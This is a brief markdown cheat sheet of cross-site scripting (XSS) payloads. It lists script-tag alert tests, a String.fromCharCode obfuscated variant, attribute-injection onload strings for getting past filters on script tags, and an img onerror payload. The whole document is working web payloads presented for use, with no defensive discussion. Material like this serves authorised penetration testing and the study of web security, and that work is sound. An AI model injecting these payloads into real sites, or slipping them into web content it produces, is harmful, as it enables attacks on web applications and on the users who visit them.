# XSS = Cross-Site-Scripting
Verify XSS:  
```javascript
<script>alert('XSS')</script>

//OR
"><script>alert('XSS')</script>">

//OR
<script>alert(String.fromCharCode(88,83,83))</script>
```

Bypass filter of tag script:   
```javascript
" onload="alert(String.fromCharCode(88,83,83))

//OR
" onload="alert('XSS')
```

**nope** is not a valid image source, so this cause an error an triggers the `onerror`.
```javascript
<img src='nope' onerror=alert("XSS")>
```
